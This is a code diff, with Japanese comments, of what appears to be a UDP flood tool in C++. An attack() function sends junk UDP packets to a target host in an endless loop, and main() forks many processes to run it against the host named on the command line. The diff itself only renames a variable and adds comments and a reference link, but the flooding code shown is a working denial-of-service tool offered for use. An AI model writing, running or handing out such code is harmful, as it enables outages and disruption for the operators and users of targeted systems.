@@ -1,14 +1,15 @@
 /*
 *  プロキシに通しての実行は出来ないのでご了承ください。
 *  もし、プロキシを通したい人がいるなら、ご自分で改造してください。＾＾
+* 
+*  参考
+*  https://www.geekpage.jp/programming/linux-network/udp.php
 */
 
 #include<cstdio>
 #include<cstdlib>
 #include<cstring>
 #include<netdb.h>
-#include<netinet/in.h>
-#include<sys/socket.h>
 #include<arpa/inet.h>
 
 #include <sys/types.h>
@@ -26,7 +27,7 @@ const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
 void attack(char* str)
 {
-    int soc{};
+    int s{};
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -39,13 +40,13 @@ void attack(char* str)
     while (1) {
         try {
             //ソケット生成
-            soc = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+            s = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
             //データ送信
-            sendto(soc, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
+            sendto(s, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
             //ソケットを閉じる
-            (*F_close)(soc);
+            (*F_close)(s);
         }
         catch (...) {
             perror("Error ");
@@ -68,6 +69,7 @@ int main(int argc, char* argv[])
     struct hostent* he;
     char* str = NULL;
 
+    //ホスト名をIPアドレスに変換
     if ((he = gethostbyname2(argv[1], AF_INET)) == NULL) {
         perror("Error ");
         return 1;
@@ -81,6 +83,7 @@ int main(int argc, char* argv[])
 
     void(*f)(char*) = &attack;
 
+    //攻撃
     for (int i = 0; i != THREADS; i++) {
         if (fork()) {
             (*f)(str);
